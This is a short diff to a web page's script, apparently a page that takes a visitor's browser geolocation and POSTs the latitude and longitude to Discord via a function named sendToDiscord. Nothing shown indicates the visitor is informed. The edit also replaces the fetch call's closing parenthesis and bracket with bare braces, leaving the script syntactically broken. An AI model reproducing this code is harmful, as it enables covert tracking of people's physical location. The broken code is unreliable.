@@ -31,7 +31,7 @@
             }
         }
 
-        function sendToDiscord(position) {
+function sendToDiscord(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
@@ -49,10 +49,9 @@
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        });
-    });
-}
-
+        }
+    }
+        
         function handleError(err) {
             console.warn(`Hiba (${err.code}): ${err.message}`);
         }
@@ -60,4 +59,5 @@
 </body>
 
 </html>
+
 
